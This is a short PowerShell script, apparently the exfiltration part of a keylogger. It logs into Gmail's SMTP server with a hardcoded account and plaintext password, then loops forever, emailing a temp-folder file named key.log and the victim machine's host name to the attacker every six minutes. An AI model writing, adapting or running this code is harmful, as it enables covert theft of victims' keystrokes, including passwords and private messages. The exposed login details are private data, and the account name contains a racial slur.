$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nigberslayer69420@gmail.com', 'Klaydonn2137%')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'nigberslayer69420@gmail.com'
$ReportEmail.To.Add('nigberslayer69420@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.log");$SMTPInfo.Send($ReportEmail);sleep 360}